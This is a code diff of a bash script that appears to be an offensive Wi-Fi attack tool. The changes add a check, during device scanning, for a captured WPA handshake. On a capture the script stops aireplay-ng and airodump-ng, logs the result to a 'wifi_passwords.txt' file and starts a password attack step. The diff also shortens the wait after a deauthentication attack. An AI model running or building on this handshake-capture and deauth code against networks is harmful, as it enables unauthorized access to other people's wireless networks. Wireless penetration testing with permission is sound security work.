@@ -431,8 +431,21 @@ function devices_scanner() {
 		break
 	    fi
 	    echo -e "Scanning for devices..  \e[1;34m$i/20\e[0m"
+	    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
+		echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
+		sudo pkill aireplay-ng
+		sudo pkill airodump-ng
+		echo
+		echo --- >> $targets_path/wifi_passwords.txt
+		printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
+		cleanup
+		choose_password_attack
+                exit 1	    
+	    fi
+     
 	    sleep 3
 	done
+ 
 	if [ -z "$target_devices" ]; then
 	    echo -e "\033[1m\nNo device were found.\033[0m"
 	    sudo pkill airodump-ng
@@ -472,8 +485,8 @@ function deauth_attack() {
 		    fi
 		done	
 		echo
-		# waiting 18 sec after deauth attack while looking for handshake:
-		for ((j=1; j<=18; j++)); do
+		# waiting 6 sec after deauth attack while looking for handshake:
+		for ((j=1; j<=6; j++)); do
 		    sleep 1
 		    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
 		        echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
